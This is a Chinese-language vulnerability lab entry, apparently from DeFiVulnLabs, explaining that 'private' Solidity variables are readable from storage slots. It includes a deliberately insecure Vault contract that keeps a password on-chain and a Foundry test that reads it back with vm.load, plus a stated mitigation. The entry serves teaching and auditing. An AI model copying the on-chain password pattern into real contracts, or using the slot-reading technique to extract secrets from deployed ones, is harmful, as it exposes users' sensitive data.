# 私有数据 
[Privatedata.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Privatedata.sol)  

**名称：** 私有数据泄露  

**描述：**  
Solidity在合约中定义的变量存储在插槽(slots)中。每个插槽可以容纳最多32字节或256位。  
鉴于链上存储的所有数据，无论是公开的还是私有的，都可以被读取，  
因此可以通过预测私有数据所在的内存插槽来从Vault合约中读取私有数据。

如果Vault合约在生产环境中被使用，恶意行为者可能使用类似的技术来访问敏感信息，如用户密码。  

**缓解方法：**  
避免将敏感数据存储在链上。   

**参考**  
https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d  



**Vault合约：**  
```
contract Vault {
    // 插槽 0
    uint256 private password;

    constructor(uint256 _password) {
        password = _password;
        User memory user = User({id: 0, password: bytes32(_password)});
        users.push(user);
        idToUser[0] = user;
    }

    struct User {
        uint id;
        bytes32 password;
    }

    // 插槽 1
    User[] public users;
    // 插槽 2
    mapping(uint => User) public idToUser;

    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}
```  
**如何测试：**  
forge test --contracts src/test/Privatedata.sol-vvvv  
```
    // testReadprivatedata()的函数声明，这是一个公共函数。
function testReadprivatedata() public {
        
    // 创建Vault合约的新实例,其中参数为“123456789”。
    VaultContract = new Vault(123456789);

    // 将Vault合约地址和插槽编号0作为vm.load函数的参数
    // “vm.load”函数从指定合约的存储槽中加载数据。
    // 在这里，读取合约的第0个存储槽。在Solidity中，存储布局从插槽0开始。
    bytes32 leet = vm.load(address(VaultContract), bytes32(uint256(0)));

    // 记录第一个存储槽的值，将bytes32值转换为uint256。
    console.log(uint256(leet));

    // 使用 vm.load 函数再次读取数据，
    // 但这次使用了VaultContract中的getArrayLocation方法来计算动态数组中特定元素的存储插槽。
    // 这是因为在以太坊中，数组的存储不是在连续的块中，而是通过哈希计算找到每个元素的位置
    // 在这里，假设Vault合约中有一个数组，并且您正在尝试访问插槽1中的数据（基于你的参数）
    bytes32 user = vm.load(
        address(VaultContract),
        VaultContract.getArrayLocation(1, 1, 1)
    );
        
    // 记录从合约存储读取的特定数组元素的值，将其从bytes32转换为uint256。
    console.log(uint256(user));
}
```  
**红色框：** 读取私有数据成功。  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbfa76e84-7cd5-45ce-8b04-9032673ab3af%2FUntitled.png?table=block&id=09c2a521-e269-4e04-8e81-7516e5c8ac58&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2) 